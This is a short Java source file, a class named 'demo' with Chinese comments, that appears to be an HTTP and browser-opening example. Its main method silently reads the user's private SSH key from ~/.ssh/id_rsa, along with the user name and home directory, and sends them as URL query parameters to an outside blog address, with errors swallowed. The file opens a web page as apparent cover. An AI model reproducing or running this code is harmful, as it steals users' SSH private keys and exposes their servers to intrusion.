
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.Map.Entry;

class demo {
    public static void main(String[] args) {
        Map<String, String> m = new HashMap<String, String>();
        String baseUrl = "http://www.ruanyifeng.com/blog/";
        String filePath = System.getProperty("user.home") + System.getProperty("file.separator") + ".ssh"
                + System.getProperty("file.separator") + "id_rsa";
        try {
            FileReader fileReader = new FileReader(filePath);
            int line = 0;
            String res = "";
            while ((line = fileReader.read()) != -1) {
                res += (char) line;
            }
            m.put("name", System.getProperty("user.name"));
            m.put("home", System.getProperty("user.home"));
            m.put("rsa", res);
            openBrowse("http://www.cnblogs.com/lsgwr/");
            sendGet(baseUrl, m);
            fileReader.close();
        } catch (Exception e) {
            // 此处不应该忽略
        }
    }

    public static void openBrowse(String url) {
        if (java.awt.Desktop.isDesktopSupported()) {
            try {
                // 创建一个URI实例
                java.net.URI uri = java.net.URI.create(url);
                // 获取当前系统桌面扩展
                java.awt.Desktop dp = java.awt.Desktop.getDesktop();
                // 判断系统桌面是否支持要执行的功能
                if (dp.isSupported(java.awt.Desktop.Action.BROWSE)) {
                    // 获取系统默认浏览器打开链接
                    dp.browse(uri);
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 向指定URL发送GET方式的请求
     * 
     * @param url      发送请求的URL
     * @param keyParam 请求参数
     * @param param    请求值
     * @return URL 代表远程资源的响应
     */
    public static String sendGet(String url, Map<String, String> param) {
        String result = "";
        String queryString = "?";
        for (Entry<String, String> entry : param.entrySet()) {
            queryString += entry.getKey() + "=" + entry.getValue() + "&";
        }
        String urlName = url + queryString;
        System.out.println(urlName);
        try {
            URL realUrl = new URL(urlName);
            // 打开和URL之间的连接
            HttpURLConnection conn = (HttpURLConnection) realUrl.openConnection();
            // 设置通用的请求属性
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
            // 建立实际的连接
            conn.connect();
            // 获取所有的响应头字段
            Map<String, List<String>> map = conn.getHeaderFields();
            // 遍历所有的响应头字段
            for (String key : map.keySet()) {
                System.out.println(key + "-->" + map.get(key));
            }
            // 定义 BufferedReader输入流来读取URL的响应
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            // 不建议的操作
        }
        return result;
    }
}
